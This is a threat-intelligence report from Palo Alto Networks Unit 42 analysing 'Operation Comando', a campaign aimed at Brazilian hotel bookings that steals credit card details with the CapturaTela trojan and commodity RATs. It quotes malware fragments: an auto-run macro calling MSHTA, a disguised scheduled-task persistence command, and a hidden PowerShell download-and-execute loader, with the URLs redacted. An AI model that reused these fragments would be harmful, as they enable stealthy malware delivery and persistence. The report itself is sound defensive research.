unit42.paloaltonetworks.com/operation-comando-or-how-to-run-a-cheap-and-effective-credit-card-businessMarch 12, 2019In December 2018, Palo Alto Networks Unit 42 researchers identified an ongoing campaign with a strong focus on the hospitality sector, specifically on hotel reservations. Although our initial analysis didn’t show any novel or advanced techniques, we did observe strong persistence during the campaign that triggered our curiosity.We followed network traces and pivoted on the information left behind by this actor, such as open directories, document metadata, and binary peculiarities, which enabled us to find a custom-made piece of malware, that we named “CapturaTela”. Our discovery of this malware family shows the reason for the persistent focus on hotel reservations as a primary vector: stealing credit card information from customers.We profiled this threat actor and that has resulted in uncovering not only their delivery mechanisms, but also their arsenal of remote access tools and info-stealing trojans, both acquired from underground forums as well as open source tools found in GitHub repositories.Have you ever wondered how an actor can run a very cheap and effective credit card data underground business? Welcome to “Operation Comando”.The attacker’s delivery mechanisms Our telemetry for this campaign identified email as the primary delivery mechanism and found the first related samples were distributed in August 2018. Topics used by the actor are typically related to travel bookings and vouchers, and target mainly Brazilian victims. Table 1 shows a representative list of typical subjects and attachment names found during the campaign.Email SubjectAttachment namesReserva para tres quartos“Ficha cadastral Leticia Ferreira Mendes.ppam”, “Ficha cadastral Jacinto Mendes da Silva.ppam”, “Ficha cadastral Marcos Portela Correa.ppam”, “Ficha cadastral Francisco Prado.ppam”Reserva Veirano AdvogadorCorrigir data da reserva para o dia 03Voucher para reservaRoominglist Veirano Advogados .docxBooking – Dados da Reserva.docxVoucher para reserva 02.docxReservaVoucher de Reserva ADRIANA MILLER RODRIGUES.ppaTable 1 Some email subjects and attachment names representative of this campaign.While investigating the malicious documents used in the campaign, we discovered an interesting consistency in the document metadata. The author consistently uses an acronym throughout their work – “C.D.T Original” (see details on Figure 1).1/16Figure 1 Example of malicious document metadataThe attackers make use of multiple common off-the-shelf methods that are observed in many campaigns, such as external references to remote scripts executed by MSHTA. Following this approach, this actor can find multiple tools and resources to perform their activities, and at the same time, make attribution and tracking more difficult for analysts. The most prevalent combinations of methods observed are depicted in Figure 2.Figure 2 Multiple delivery mechanisms.As an example of an email delivery used during December 2018 campaigns, let’s look at what pretended to be a rooming list (SHA256: using MSHTA:Public Sub Auto_Open()var0 = “MSHTA url”Var = var0Shell (Var)End SubThe landing URL resolves to:hxxps://internetexplorer200[.]blogspot[.]com/The statistics for the URL-shortened link on bit.ly confirm the observations from our telemetry, showing targets mainly in Brazil, as depicted in Figure 4 Distribution of Bit.ly campaign on 27- 28th December.Figure 4 Distribution of Bit.ly campaign on 27-28th December3/16MSHTA executes VBScript contents that are encoded/obfuscated using a very simple algorithm (note the presence of Portuguese words throughout the code).Figure 5 First stage VBScript code run via MSHTAThis results in the following scheduled task created in the system, where a new second-stage script is invoked via MSHTA from another remote location. Note that the second-stage VB code contains a reference to “CDT” in a comment.“set shhh = CreateObject(\”WScript.Shell\”)\r\n Dim var1\r\n var1 = \”cmd.exe /c SchTasks /Create /sc MINUTE /MO 240 /TN AdobeUpdateSD /TR \”\”.exe url”\r\nshhh.run var1, vbHide\r\n”Figure 6 Second-stage VB scriptThis second-stage VBScript code ends up loading a final payload in memory via PowerShell reflection, fetching the binary content from a file with a GIF extension:“CreateObject(\”Wscript.Shell\”).run \”cmd.exe /c powershell -ExecutionPolicy Bypass - windowstyle hidden -noexit -command [Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(‘url’))).EntryPoint.Invoke($null,$null)\”\r\n”The final payload delivered in this case is Revenge Remote Access Trojan (RAT), a commodity tool which can be used to facilitate information theft.Infrastructure analysis4/16At the infrastructure level, the attacker makes use of dynamic DNS (DDNS) services such as DuckDNS, WinCo, or No-IP, many of which offer free accounts lowering the investment required for attacker infrastructure. Some examples of the domains in use are detailed in Table 2.Dynamic DNS Domainssystenfailued.ddns[.]com[.]broffice365update[.]duckdns[.]orgcdtoriginal[.]ddns[.]netTable 2 Examples of domains associated with this campaign using DDNS providersIn addition to using free services, paste sites, and compromised sites, we have also identified at least one domain that appears to be actor-owned. The domain “fejalconstrucoes[.]com[.]br” has been used to host payloads, as well as send emails to potential victims. Figure 7 DNS WHOIS record shows details on the domain, which has been registered using the UOL service in Brazil.5/16Figure 7 DNS WHOIS recordEmails with malicious attachments belonging to this campaign have been found with the following characteristics:Domain: fejalconstrucoes[.]com[.]brEmail Senders: mmcorrea@fejalconstrucoes.com.br, marcos@fejalconstrucoes.com.brAttachment names: Contrato Anual FEJAL Construçoes.ppaAs mentioned before, an interesting detail on domains and paths used by the attacker is the use of the recurring acronym “CDT”, as for example:6/16hxxp://bit[.]ly/cdtquedahxxp://cdtoriginal.ddns[.]netIdentifying the main business driver: “CapturaTela” During our investigation, one open directory identified allowed us to find several payloads used by the attacker. Table 3 displays the set of payloads and documents found. The acronym “CDT” keeps appearing even in file names used.FilenameCDT.htaCopia Detalhe da reserva – basic base64 encoded payload dropper (see Figure 8), with a very simple and interesting payload for our investigation.7/16Figure 8 JS base64 payload dropper8/16The decoded payload is a PE file, written in .NET, with information-stealing capabilities. One of its main methods gives name to our malware family “CapturaTela”, and as its Portuguese name indicates, it has the capability to save a screenshot into a Bitmap object.Figure 9 CapturaTela method’s screen capture capabilities.The main functionality of this malicious information-stealing trojan is the following (see Figure 10):Iterate over the open processes list and check for specific window titles. The title has to contain either “ls . B” or “o . B” for the sample to perform further activity. If the title is found, a screenshot will be taken and sent by email as a JPEG attachment (see Figure 12). It will kill existing Chrome processes when done. The windows’ titles are probably based on Chrome tag contents.Figure 10 Main functionality loop of CapturaTela9/16In order to validate the functionality, we decided to create a simple web page matching the title content and patched the malicious sample to use a test email account under our control (see Figure 12).Figure 12 Test HTML page and debugging CapturaTela functionalityAs a result, as displayed in Figure 13, we confirmed the format and contents of the exfiltrated information that the attacker was planning to collect from its victims.10/16So, the only remaining question for our investigation was the kind of content and window titles that this information-stealing trojan was looking for? Which kind of web pages could contain “ls · B” or “o · B” as part of their title?Initially, finding a website with these properties seemed to be an impossible task, but we started the research based on what we knew around the targets and email delivery session metadata used on these campaigns. From this data, we were able to identify potential target websites containing certain – but common to the industry and nature of the business – terms in their website page titles, in both English and Portuguese, that would match the string pattern- matching described above and invoke the malware’s credit card stealing capabilities. The websites found lead us to the fact that the attacker’s focus is on getting the victim’s full credit card details during a given purchase process.After analyzing several CapturaTela samples, and extracting the contents of the email configuration portion, several interesting strings were found as displayed in Table 4.Interesting stringsComando30Comando30@cdtcomando50The continuous use of the “CDT” acronym, and the presence of the word “Comando”, which we could associate to the first letter, led to us to choose “Operation Comando” to describe this campaign.Extensive use of Remote Access Trojans Aside from the use of the custom trojan CapturaTela, the actor makes extensive use of several other remote access trojans to perform its malicious activities. The following RAT families has been observed during the actor campaign.RAT FamilyLimeRATRevengeRATNjRAT11/16AsyncRATNanoCoreRATRemcosRATTable 5 Top RAT families observed in this campaignThe extensive use of these RAT tools potentially increases the business objectives, given the amount of information the actor can obtain on top of credit card purchase results stolen from target websites via infected victims.There are several examples of RAT families used that can be found in GitHub such as:url with other published research Some of the domains and samples found on this investigation have been already researched and reported by Yoroi. Based on the details of our research, we have a strong belief that despite some minor overlaps in the techniques used, this campaign is not related to Gorgon Group.Conclusions Operation Comando is a pure cybercrime campaign, possibly with Brazilian origin, with a concrete and persistent focus on the hospitality sector, which proves how a threat actor can be successful in pursuing its objectives while maintaining a cheap budget. The use of DDNS services, publicly available remote access tools, and having a minimum knowledge on software development (in this case VB.NET) has been enough for running a campaign lasting month, and potentially gathering credit card information and other possible data.While cybercrime campaigns like this remain active, Palo Alto Networks customers are protected from these threats in the following ways:WildFire detects all malicious documents and payloads delivered as malware. AutoFocus customers can track this campaign using the following tag: Traps blocks all of the files associated with this campaign.Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit 